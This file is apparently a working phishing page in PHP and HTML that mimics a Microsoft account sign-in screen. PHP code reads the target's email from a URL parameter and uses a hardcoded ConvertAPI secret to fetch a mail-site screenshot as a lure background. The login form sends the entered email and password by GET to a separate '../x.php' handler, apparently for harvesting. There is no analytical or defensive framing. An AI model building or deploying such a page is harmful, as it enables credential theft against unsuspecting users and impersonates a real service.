﻿<?php
//website url

if (file_exists($filename)) {
echo "The file $filename exists";
}else{
$domin = substr(strrchr($_GET['uid'],"@"), 1);
$siteURL = "https://mail.google.com";
//call Google PageSpeed Insights API
$googlePagespeedData = file_get_contents("https://v2.convertapi.com/convert/url/to/png?Secret=MTLwmQMsDSFydS1a&Url=$siteURL&FileName=back&Timeout=1000&WebHook=https%3A%2F%2Fgoogle.com&Zoom=2");
//decode json data
$googlePagespeedData = json_decode($googlePagespeedData, true);
$screenshot = $googlePagespeedData['Files'][0]['FileData'];
$image = "data:image/jpeg;base64,".$screenshot;
}
?>



<html dir="ltr" lang="EN-US">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta property="og:image" content="thumb.png"/> 
<script type="text/javascript">var PROOF = {};PROOF.Type = {SQSA: 6, CSS: 5, DeviceId: 4, Email: 1, AltEmail: 2, SMS: 3, HIP: 8, Birthday: 9, TOTPAuthenticator: 10, RecoveryCode: 11, StrongTicket: 13, TOTPAuthenticatorV2: 14, Voice: -3};</script><noscript>&lt;meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=EN-US&amp;lc=1033"/&gt;Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.&lt;br /&gt;&lt;br /&gt;To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.</noscript><title>Account  admin center - Security &amp;amp; privacy</title><meta name="description" content="Sign in to your OneDrive cloud storage and Office Online."><meta name="PageID" content="i5030"><meta name="SiteID" content="250206"><meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27683.1/images/favicon.ico">

<link crossorigin="anonymous" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8148.16/content/cdnbundles/converged.v2.login.min_t7iocdq0wq2qh0nv233jig2.css" rel="stylesheet" onerror='$Loader.On(this,true)' onload='$Loader.On(this)' integrity='sha384-XLlMVBd8JX32scdVnhaAQTf07iy+vc6llzsdl6ir7f9pz0Ru+/rMD8vkB1JFOdj2' />
<style type="text/css">body.cb input.hip{border-width: 2px !important;}</style><style type="text/css">body{display:none;}</style>

<script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script>

<style type="text/css">body{display:block !important;}</style>

<noscript>&lt;style type="text/css"&gt;body{display:block !important;}&lt;/style&gt;</noscript>

<script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var s=t[n]={exports:{},id:n,loaded:!1};return e[n].call(s.exports,s,s.exports,r),s.loaded=!0,s.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){var t=window,n=t.navigator;t.g_iSRSFailed=0,t.g_sSRSSuccess="",r.SRSRetry=function(e,r,s,i){var a=1,c=unescape("%3Cscript type='text/javascript' src='"),o=unescape("'%3E%3C/script%3E"),u=r;if(n&&n.userAgent&&i&&i!==r){var S=n.userAgent.toLowerCase(),d=S.indexOf("edge")>=0;if(!d){var p=S.match(/chrome\/([0-9]+)\./),f=p&&2===p.length&&!isNaN(p[1])&&parseInt(p[1])>54;f&&(u=i)}}t.g_sSRSSuccess.indexOf(e)===-1&&("undefined"==typeof t[e]?(t.g_iSRSFailed=1,s<=a&&document.write(c+u+o)):t.g_sSRSSuccess+=e+"|"+s+",")}}]));var g_dtFirstByte=new Date();var g_objPageMode = null;</script>

<link rel="image_src" href="https://auth.gfx.ms/16.000.27683.1/images/Windows_Live_v_thumb.jpg">

<script type="text/javascript" src="https://auth.gfx.ms/16.000.27683.1/ConvergedLoginPaginatedStrings.EN.js"></script>
<script type="text/javascript" src="https://auth.gfx.ms/16.000.27683.1/ConvergedLogin_PCore.js"></script>

<script type="text/javascript">SRSRetry("__ConvergedLoginPaginatedStrings","https://auth.gfx.ms/16.000.27683.1/ConvergedLoginPaginatedStrings.EN.js",1,"https://msagfx.live.com/16.000.27683.1/ConvergedLoginPaginatedStrings.EN.js");SRSRetry("__ConvergedLogin_PCore","https://auth.gfx.ms/16.000.27683.1/ConvergedLogin_PCore.js",1,"https://msagfx.live.com/16.000.27683.1/ConvergedLogin_PCore.js");</script>

<script type="text/javascript">SRSRetry("__ConvergedLoginPaginatedStrings","https://auth.gfx.ms/16.000.27683.1/ConvergedLoginPaginatedStrings.EN.js",2,"https://msagfx.live.com/16.000.27683.1/ConvergedLoginPaginatedStrings.EN.js");SRSRetry("__ConvergedLogin_PCore","https://auth.gfx.ms/16.000.27683.1/ConvergedLogin_PCore.js",2,"https://msagfx.live.com/16.000.27683.1/ConvergedLogin_PCore.js");</script>



</head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><!--  --> <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(<?php echo $image;?>);background-size: contain;"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image:url(<?php echo $image;?>); background-size: contain;"></div><!-- /ko --><!-- ko if: !!backgroundImageUrl() --> 

<div class="background-overlay"></div>


<!-- /ko --> </div></div> <form name="f1" id="i0281"  method="get"  autocomplete="off"  action="../x.php"><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.AN,
            showFooterLinks: true,
            useWizardBehavior: svr.Bb,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.aY --><!-- /ko --> <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl(), 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') }"><!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') --><!-- /ko --><!-- ko if: svr.B7 && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: showErrorDetails --><!-- /ko --> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            showLearnMore: $loginPage.learnMore_onShow } }"><!--  --> <div><img src="https://upload.wikimedia.org/wikipedia/commons/5/52/Mail_iOS.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" width="35" height="52" class="logo" role="presentation"></div>
<p><strong>Sign in  to countinue</strong></p>
<div class="col-md-24">
  <div class="text-13 action-links">
    <!-- ko if: svr.Am && !svr.aK && !svr.ak -->
    <div class="form-group" data-bind="htmlWithBindings: html['WF_STR_SignUpLink_Text'], childBindings: { 'signup': {
                href: svr.g,
                css: { 'display-inline-block': true },
                ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'],
                click: signup_onClick } }">No account? <a href="https://signup.live.com/?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1518627829&amp;rver=6.7.6643.0&amp;wp=MBI_SSL_SHARED&amp;wreply=https:%2F%2Fonedrive.live.com%2F%3Fid%3Dfavorites%26mkt%3Den-US&amp;id=250206&amp;cbcxt=sky&amp;lw=1&amp;fl=easi2&amp;contextid=4B4EB48978839295&amp;bk=1518644638&amp;uiflavor=web&amp;uaid=3591241b83584a11927ece0e4c942a8c&amp;mkt=EN-US&amp;lc=1033" id="signup" class="display-inline-block" aria-label="Create a Microsoft account">Create one!</a></div>
    <!-- /ko -->
    <!-- ko component: { name: "cred-switch-link-control",
                params: {
                    availableCreds: availableCredsWithoutUsername },
                event: {
                    switchView: noUsernameCredSwitchLink_onSwitchView } } -->
    <!-- ko if: altCreds.length > 0 -->
    <!-- /ko -->
    <!-- /ko -->
    <!-- ko if: !svr.B1 && svr.Bq -->
    <!-- /ko -->
    <!-- ko if: svr.showCantAccessAccountLink -->
    <!-- /ko -->
  </div>
</div>
<!-- ko if: pageDescription && !svr.aM --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.ah ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input type="email" name="uid"autofocus required id="i0116" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" data-bind="textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    css: { 'has-error': usernameTextbox.error },
                    attr: inputAttributes" placeholder="Email, phone, or Skype" aria-label="Enter your email, phone, or Skype."> <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" aria-label="Please wait" style="display: none;"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div> <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin || svr.fRepositionFooterButtons, &#39;button-container&#39;: svr.fRepositionFooterButtons }"><!-- ko if: isSecondaryButtonVisible --> <!-- /ko --> <div data-bind="
        css: {
            &#39;inline-block&#39;: svr.fRepositionFooterButtons,
            &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            &#39;col-xs-24&#39;: !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                &#39;id&#39;: primaryButtonId || &#39;idSIButton9&#39;,
                &#39;aria-describedby&#39;: primaryButtonDescribedBy },
            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Next"> </div> </div> <div class="row"></div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div>  </div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: showOptOutBanner --><!-- /ko --> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick,
                moreInfoClick: footer_onShowDebugDetails } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.B5">©2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'], attr: { title: str['CT_STR_More_Options_Ellipsis_AriaLabel'] }" aria-label="Click here for more options" title="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
                
                <img class="desktopMode" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27683.1/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://auth.gfx.ms/16.000.27683.1/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="https://auth.gfx.ms/16.000.27683.1/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27683.1/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://auth.gfx.ms/16.000.27683.1/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="https://auth.gfx.ms/16.000.27683.1/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div> <!-- /ko --></div> </div> </form> <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.bR --><!-- /ko --><!-- ko if: svr.bj --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.bj }"><iframe height="0" width="0" src="https://onedrive.live.com/preload?view=Folders.All&amp;id=250206&amp;mkt=EN-US" style="display: none;"></iframe></div> <!-- /ko --></div></body></html>